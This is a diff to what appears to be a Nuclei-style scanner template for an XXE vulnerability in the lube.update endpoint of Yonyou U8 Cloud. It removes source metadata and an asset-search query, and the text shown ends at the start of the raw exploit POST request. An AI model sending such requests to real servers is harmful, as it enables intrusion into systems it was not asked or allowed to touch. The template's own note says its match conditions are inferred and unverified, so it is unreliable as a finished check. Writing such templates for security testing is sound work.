@@ -3,14 +3,8 @@ info:
   name: 用友U8Cloudlube.update存在xxe漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3927a9d772844b9a0b3f6df3e4fab7bc
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: xxe,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 3927a9d772844b9a0b3f6df3e4fab7bc
-    fofa: + hunter`app.name="用友 U8 Cloud"`
 http:
 - raw:
   - 'POST /hrss/dorado/lube.update.d?__rpc=true&__rpcAgent=true HTTP/1.1
